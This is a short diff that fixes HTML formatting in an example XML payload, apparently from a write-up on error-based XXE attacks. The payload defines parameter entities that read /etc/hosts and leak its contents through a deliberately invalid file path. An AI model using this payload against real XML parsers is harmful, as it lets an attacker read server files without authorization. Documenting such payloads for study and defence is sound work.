@@ -122,7 +122,7 @@ external interaction is required.
     &lt;body&gt;
 	TEXT
 	&lt;!ENTITY % file SYSTEM "file:///etc/hosts"&gt;
-	&lt;!ENTITY % eval "&lt;!ENTITY <blockquote>&#x25;</blockquote> exfil SYSTEM 'file:///404FILE/%file;'&gt;"&gt;
+	&lt;!ENTITY % eval "&lt;!ENTITY &#x25; exfil SYSTEM 'file:///404FILE/%file;'&gt;"&gt;
 	%eval;
 	%exfil;
     &lt;/body&gt;
